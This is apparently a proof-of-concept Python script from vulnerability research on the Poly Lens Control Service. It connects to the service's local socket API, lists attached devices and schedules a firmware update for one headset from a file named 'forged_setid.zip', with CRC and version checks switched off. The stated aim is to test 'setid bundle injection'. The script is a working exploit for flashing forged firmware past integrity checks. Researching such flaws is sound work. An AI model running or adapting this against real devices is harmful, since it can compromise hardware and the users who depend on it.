#!/usr/bin/env python3
"""Trigger a DFU via LensServiceApi against the official LCS to test setid bundle injection."""
import json
import socket
import time
import sys
import uuid

SOH = "\x01"

PORT_FILE = r"C:\ProgramData\Poly\Lens Control Service\SocketPortNumber"
AC28_DEVICE_ID = "PLT_049160FE6715450F8A4FB2C44EA91AD2"
FW_FILE = r"C:\Users\Administrator\AppData\Local\Temp\setid_test\forged_setid.zip"


def send_msg(s, msg):
    s.sendall((json.dumps(msg) + SOH).encode("utf-8"))


def recv_until(s, timeout=3):
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = s.recv(8192)
            if not chunk:
                break
            data += chunk
            if SOH.encode() in data:
                break
    except socket.timeout:
        pass
    return data.decode("utf-8", errors="replace")


def main():
    port = int(open(PORT_FILE).read().strip())
    print(f"Connecting to LCS on port {port}")
    s = socket.socket()
    s.connect(("127.0.0.1", port))

    print("\n--- RegisterClient ---")
    send_msg(s, {
        "type": "RegisterClient",
        "clientName": "polytool-probe",
        "clientVersion": "1.0",
        "apiVersion": "1.14.1",
    })
    print(recv_until(s)[:500])

    print("\n--- GetDeviceList ---")
    send_msg(s, {"type": "GetDeviceList"})
    response = recv_until(s, timeout=5)
    # Parse and show device IDs only
    s.settimeout(0)
    for chunk in response.split(SOH):
        if not chunk.strip():
            continue
        try:
            msg = json.loads(chunk)
            if msg.get("type") == "DeviceList":
                for d in msg.get("devices", []):
                    print(f"  {d.get('deviceId')} pid={d.get('pid')} {d.get('productName')} attached={d.get('attached')}")
                break
        except json.JSONDecodeError:
            continue

    print(f"\n--- ScheduleDfuExecution with FirmwareFile={FW_FILE} ---")
    req_id = str(uuid.uuid4())
    send_msg(s, {
        "type": "ScheduleDfuExecution",
        "id": req_id,
        "deviceId": AC28_DEVICE_ID,
        "firmwareFile": FW_FILE,
        "ignoreCrc": True,
        "ignoreVersionCheck": True,
    })
    # Drain any response messages
    print("Listening for events for 30s...")
    s.settimeout(30)
    deadline = time.time() + 30
    buf = b""
    while time.time() < deadline:
        try:
            chunk = s.recv(8192)
            if not chunk:
                break
            buf += chunk
            # Process complete messages
            while SOH.encode() in buf:
                msg_bytes, _, buf = buf.partition(SOH.encode())
                if msg_bytes:
                    try:
                        msg = json.loads(msg_bytes)
                        mt = msg.get("type", "?")
                        # Show DFU-related events
                        if "Dfu" in mt or "Firmware" in mt or "Update" in mt:
                            print(f"  [{mt}] {json.dumps(msg)[:300]}")
                    except json.JSONDecodeError:
                        print(f"  (non-json) {msg_bytes[:200]}")
        except socket.timeout:
            break

    s.close()


if __name__ == "__main__":
    main()
